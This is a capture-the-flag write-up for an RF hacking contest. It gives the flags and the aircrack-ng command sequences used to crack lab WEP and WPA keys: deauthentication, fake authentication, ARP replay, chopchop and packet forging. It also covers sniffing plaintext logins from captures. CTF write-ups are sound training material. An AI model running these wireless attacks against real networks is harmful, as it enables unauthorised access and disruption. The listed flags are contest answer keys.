

# Some basic setup
Start VMs. Download ssh key to working folder. Edit ~/.ssh/config to setup easy ssh sessions. Using Pentoo here. 
```
Host rfctf 
    Hostname concordat-fmigration.contestant.rfhackers.com
    User root
    Port 2201
    IdentityFile /home/user/Repos/CTFs/RFCTF_2025/RFCTF_Key
    IdentitiesOnly yes
```

Start ssh session to prot-forward kismet_server to localhost
```
ssh -L 8080:localhost:2501 rfctf 
```

Start kismet
```
ksimet_server
```

Go to kismet web ui
```
http://localhost:8080
```

We can export kismet database to pcap. 
```
cp *.kismet temp.db
kismetdb_to_pcap --in temp.db --out kismet.pcap
```

Then copy that to localhost for inspection. On host shell
```
rsync -Paz rfctf:~/kismet.pcap .
```

Want to also rsync any airmon-ng packet captures.


# RFHS_RFCTF_WEP 
25 Points

Find password for network.

## Flag
```
uitgesorteerd
```

## Solution
Simple WEP network. The tutorial at
[https://www.aircrack-ng.org/doku.php?id=simple_wep_crack](https://www.aircrack-ng.org/doku.php?id=simple_wep_crack)

Use kismet ui to find access point mac.

Four additional ssh terminals  (no port-forwarding needed) 
```
ssh rfctf
```

Workflow for terminals.
1. Edit variables script. Start monitor on channel. Start capture with airodump-ng. When done, stop monitor.
2. Test packet injectionm. Start fake auth with aireplay-ng
3. Start deauth with aireplay-ng
4. Wait a bit, start aircrack on capture file


## terminal 1 cmds
Edit vars file
```
# must haves
phy=wlan32
phy_mac=02:00:00:00:20:00
monitor=wlan32mon
channel=1
accesspoint_mac=00:62:6D:48:76:3F
capture_file=ctfwep

# wep stuff
auth_rate=10
keepalive_rate=1
send_rate=1

# aireplay-ng modes used
test_inject_mode=9
fake_auth_mode=1
arp_request_replay_mode=3
```

Proceed with interface setup and capture
```
. ./vars.sh
airmon-ng start $phy $channel
airodump-ng -c $channel --bssid $accesspoint_mac -w $capture_file.cap $monitor
airmon-ng stop $monitor
```

## terminal 2 cmds 
Source the variables set upo in terminal 1. Test packet injection. Assuming this works, proceed to use aireplay-ng to do a fake authentication with the access point.
```
. ./vars.sh
aireplay-ng -$test_inject_mode -a $accesspoint_mac  $monitor
aireplay-ng -$fake_auth_mode $auth_rate -o $send_rate -q $keepalive_rate -a $accesspoint_mac -h $phy_mac $monitor
```

## terminal 3 cmds
Start aireplay-ng in ARP request replay mode. Terminal 1 airodump-ng screen should show data packets should be increasing rapidly. The “#/s” (packets per second) should be a decent number. If you receive a message similar to “Got a deauth/disassoc packet. Is the source mac associated?”, this means you have lost association with the AP. All your injected packets will be ignored. Terminal 2 shoule handle this and you should see successfully associate with the AP within the auth rate set.
```
. ./vars.sh
aireplay-ng -$arp_request_replay_mode -b $accesspoint_mac -h $phy_mac $monitor
```

## terminal 4 cmds
Run aircrack-ng to obtain the WEP key.
```
. ./vars.sh
aircrack-ng -b $accesspoint_mac $capture_file*.cap
```



# RFHS_RFCTF_WPA
25 Points

Find password for network.

## Flag
```
riaVxJsJtMz
```

## Solution
Simple WPA network. Used tutorial at
[https://www.aircrack-ng.org/doku.php?id=cracking_wpa](https://www.aircrack-ng.org/doku.php?id=cracking_wpa)

Use kismet ui to find access point mac and client mac.

Two ssh sessions with the follwoing workflow
1. Edit vars. Start monitor. 
2. Deauth client. Crack.

## Terminal 1 cmds
Edit vars file
```
# must haves
phy=wlan32
monitor=wlan32mon
channel=1
accesspoint_mac=02:62:6D:48:76:3
client_mac=02:00:00:00:0E:00
capture_file=ctfwpa

# wep stuff
auth_rate=10
keepalive_rate=1
send_rate=1

# aireplay-ng modes used
deauth_mode=0
arp_request_replay_mode=3
```

Proceed with interface setup and capture
```
. ./vars.sh
airmon-ng stop $monitor
airmon-ng start $phy $channel
airodump-ng -c $channel --bssid $accesspoint_mac -w $capture_file.cap $monitor
airmon-ng stop $monitor
```
## Terminal 2 cmds
Source vars
```
. ./vars.sh
```

Deauth. May need to cycle this a couple times - untill you see terminal 1 monitor capture handshake.
```
aireplay-ng -$deauth_mode 1 -a $accesspoint_mac -c $client_mac $monitor
```

When handshake seen - run aircrack.
```
aircrack-ng -w preschool-tiny.words -b $accesspoint_mac $capture_file*.cap
```


# RFHS_RFCTF_01
25

Submit the password for this network.

## Flag
```
KEY FOUND! [ 6C:6F:76:65:73:73:70:65:6E:64:69:6E:67 ] (ASCII: lovesspending )
```

## Solution
Same process as RFHS_RFCTF_WEP.

vars.sh 
```
# must haves
phy=wlan32
phy_mac=02:00:00:00:20:00
monitor=wlan32mon
channel=1
accesspoint_mac=00:81:09:4f:8c:9b
capture_file=ctf1

# wep stuff
auth_rate=10
keepalive_rate=1
send_rate=1

# aireplay-ng modes used
test_inject_mode=9
fake_auth_mode=1
arp_request_replay_mode=3
```



# RFHS_RFCTF_04
25 Points

Submit the password for this network.

## Flag
```
TTykesfrom
```

## Solution
Same as RFHS_RFCTF_WPA

vars.sh
```
# must haves
phy=wlan32
monitor=wlan32mon
channel=36
accesspoint_mac=02:56:C6:CE:EB:38
client_mac=02:00:00:00:10:00
capture_file=ctf4

# wep stuff
auth_rate=10
keepalive_rate=1
send_rate=1

# aireplay-ng modes used
deauth_mode=0
arp_request_replay_mode=3
```


# RFHS_RFCTF_05

## Flag
```
klantenaccount
```

## Solution
WPA2 CCMP PSK. Same as RFHS_RFCTF_WPA

vars.sh
```
# must haves
phy=wlan32
$phy_mac=02:00:00:00:20:00
monitor=wlan32mon
channel=36
accesspoint_mac=00:A9:88:2D:1E:16
client_mac=02:00:00:00:11:00
capture_file=ctf5

# aireplay-ng modes used
deauth_mode=0
arp_request_replay_mode=3
```

# RFHS_RFCTF_08
125 Points

Submit the password for this network.

## Flag
```
Maternity
```

## Solution
Same as RFHS_RFCTF_WPA

vars.sh
```
# must haves
phy=wlan32
monitor=wlan32mon
channel=36
accesspoint_mac=00:40:AF:F3:70:1B
client_mac=02:00:00:00:14:00
capture_file=ctf8

# wep stuff
auth_rate=10
keepalive_rate=1
send_rate=1

# aireplay-ng modes used
deauth_mode=0
arp_request_replay_mode=3
```

# RFHS_RFCTF_10
25 Points

Submit the password for this network.

## Flag
```
posit
```

## Solution
WEP, but has a client. Simple WEP was taking too long. look for different way. Tutorial at 
[https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_via_a_wireless_client](https://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_via_a_wireless_client)


vars.sh
```
# must haves
phy=wlan31
phy_mac=40:00:00:00:1f:00
monitor=wlan31mon
channel=1
accesspoint_mac=00:7C:E6:52:F5:DA
client_mac=02:00:00:00:16:00
capture_file=ctf10.cap

# wep stuff
auth_rate=10
keepalive_rate=1
send_rate=1

# aireplay-ng modes used
test_inject_mode=9
fake_auth_mode=1
arp_request_replay_mode=3
```


```
aireplay-ng -4 -h $client_mac $monitor
```
Look for the following
```
        Size: 70, FromDS: 0, ToDS: 1 (WEP)

              BSSID  =  00:7C:E6:52:F5:DA
          Dest. MAC  =  FF:FF:FF:FF:FF:FF
         Source MAC  =  02:00:00:00:16:00

        0x0000:  8841 2c00 007c e652 f5da 0200 0000 1600  .A,..|.R........
        0x0010:  ffff ffff ffff 5009 0000 74b6 bc00 bf95  ......P...t.....
        0x0020:  2508 9953 dc25 45e4 7541 2e12 6089 4130  %..S.%E.uA..`.A0
        0x0030:  9268 2582 4ffd f7fc 29ea 6310 76cd 3548  .h%.O...).c.v.5H
        0x0040:  357c e118 902a                           5|...*

Use this packet ? y

Saving chosen packet in replay_src-0810-171154.cap

Offset   67 ( 5% done) | xor = D8 | pt = F2 |   89 frames written in  6377ms
Offset   66 ( 8% done) | xor = 88 | pt = 18 |   95 frames written in  3831ms
Offset   65 (11% done) | xor = 82 | pt = 9A |  256 frames written in 10723ms
Offset   64 (13% done) | xor = 27 | pt = C6 |    2 frames written in    28ms
Offset   63 (16% done) | xor = 7D | pt = 01 |  232 frames written in  7072ms
Offset   62 (19% done) | xor = 5B | pt = 6E |  219 frames written in  7093ms
Offset   61 (22% done) | xor = 58 | pt = 10 |   97 frames written in  3607ms
Offset   60 (25% done) | xor = 99 | pt = AC |   32 frames written in   611ms
Offset   59 (27% done) | xor = 32 | pt = FF |   17 frames written in   522ms
Offset   58 (30% done) | xor = 89 | pt = FF |  203 frames written in  9151ms

...

Offset   34 (97% done) | xor = D4 | pt = 08 |  163 frames written in  8726ms

Saving plaintext in replay_dec-0810-171622.cap
Saving keystream in replay_dec-0810-171622.xor

Completed in 261s (0.12 bytes/s)

```


```
tcpdump -n -vvv -e -s0 -r replay_dec-0810-171622.cap
reading from file replay_dec-0810-171622.cap, link-type IEEE802_11 (802.11), snapshot length 65535
dropped privs to pcap
17:16:22.244859 44us CF +QoS BSSID:00:7c:e6:52:f5:da SA:02:00:00:00:16:00 DA:ff:ff:ff:ff:ff:ff LLC, dsap SNAP (0xaa) Individual, ssap SNAP (0xaa) Command, ctrl 0x03: oui Ethernet (0x000000), ethertype ARP (0x0806), length 28: Ethernet (len 6), IPv4 (len 4), Request who-has 172.16.110.1 (ff:ff:ff:ff:ff:ff) tell 172.16.110.226, length 28
```

```
packetforge-ng --arp -a $accesspoint_mac -c $client_mac -h 00:40:F4:77:F0:9B -j -o -l 172.16.110.1 -k 172.16.110.226 -y replay_dec-0810-171622.xor -w arpforge.cap

tcpdump -n -vvv -e -s0 -r arpforge.cap 
```

```
aireplay-ng -2 -r arpforge.cap $monitor
```

Data show be zooming in airodump


# RFHS_RFCTF_11
50 Points

Submit the password for this network.

## Flag
```
Workplace
```

## Solution
Kinda stumbled into this on. There was a hidden WPA network that poped up. Used WPA attack. In the process, it identified itself.


# RFHS_RFCTF_14
50 Points

A user is accessing an insecure service on this network, submit their password.

## Flag
```
muffin-man
```

## Solution
Export kismet database to pcap. Use wireshark to search tcp streams for logins. Found the following:
```
172.16.114.189 -> 172.16.114.1
user: passwordiskey
pass: muffin-man
```

# RFHS_RFCTF_15
125 Points

A user is accessing an insecure service on this network, submit their password.

## Flag
```
baa-baa
```

## Solution
Same process as RFHS_RFCTF_14. Found
```
172.16.115.1 -> 172.16.115.1
user:
pass: baa-baa
```






